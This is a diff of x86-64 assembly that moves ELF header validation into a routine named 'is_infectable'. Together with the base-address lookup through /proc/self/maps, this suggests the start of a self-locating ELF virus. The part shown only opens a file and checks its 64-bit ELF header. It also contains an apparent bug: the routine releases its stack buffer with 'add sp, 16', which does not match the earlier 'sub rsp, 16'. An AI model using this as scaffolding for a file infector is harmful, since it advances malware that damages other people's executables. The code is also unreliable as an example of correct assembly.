@@ -76,30 +76,10 @@ endstruc
 
 _start:
     call get_base_address
+    push rbx
 
-    mov rax, SYS_OPEN
-    mov rsi, O_RDONLY
     lea rdi, [rel file_path]
-    syscall
-    cmp eax, 0
-    jl error
-
-    mov r8, rax
-
-    sub rsp, 16
-
-    mov rax, SYS_READ
-    mov rdi, r8
-    lea rsi, [rsp]
-    mov rdx, 16
-    syscall
-    cmp eax, 0
-    jl error
-
-    lea rdi, [rsp]
-    call elf64_ident_check
-
-    add rsp, 16
+    call is_infectable
 
     mov rax, SYS_CLOSE
     mov rdi, r8
@@ -109,31 +89,56 @@ _start:
     mov rdi, 0
     syscall
 
-; elf64_ident_check
-elf64_ident_check:
-    mov eax, DWORD [rdi]
-    cmp eax, (ELFMAG3 << 24) | (ELFMAG2 << 16) | (ELFMAG1 << 8) | (ELFMAG0)
-    jne not_elf
+; rdi: file_path
+is_infectable:
+    open_file:
+        mov rax, SYS_OPEN
+        mov rsi, O_RDONLY
+        syscall
+        cmp eax, 0
+        jl error
+    ; open_file
 
-    cmp BYTE [rdi + EI_CLASS], ELFCLASS64
-    jne not_64_bit
-    cmp BYTE [rdi + EI_DATA], ELFDATANONE
-    je not_elf
-    cmp BYTE [rdi + EI_VERSION], EV_CURRENT
-    jne not_elf
+    mov r8, rax
+    sub rsp, 16
 
-    mov rcx, 7
-    lea rsi, [rdi + EI_PAD]
-    check_padding:
-        cmp BYTE [rsi], 0
+    read_e_ident:
+        mov rax, SYS_READ
+        mov rdi, r8
+        lea rsi, [rsp]
+        mov rdx, 16
+        syscall
+        cmp eax, 0
+        jl error
+
+    lea rdi, [rsp]
+    elf64_ident_check:
+        mov eax, DWORD [rdi]
+        cmp eax, (ELFMAG3 << 24) | (ELFMAG2 << 16) | (ELFMAG1 << 8) | (ELFMAG0)
         jne not_elf
-        inc rsi
-        loop check_padding
-    ; check_padding
 
+        cmp BYTE [rdi + EI_CLASS], ELFCLASS64
+        jne not_64_bit
+        cmp BYTE [rdi + EI_DATA], ELFDATANONE
+        je not_elf
+        cmp BYTE [rdi + EI_VERSION], EV_CURRENT
+        jne not_elf
+
+        mov rcx, 7
+        lea rsi, [rdi + EI_PAD]
+        check_padding:
+            cmp BYTE [rsi], 0
+            jne not_elf
+            inc rsi
+            loop check_padding
+        ; check_padding
+    ; elf64_ident_check
+    add sp, 16
     ret
-; elf64_ident_check
+; is_infectable
 
+; in: -
+; out: base_address (rbx)
 get_base_address:
     mov rsi, O_RDONLY
     lea rdi, [rel proc_self_maps]
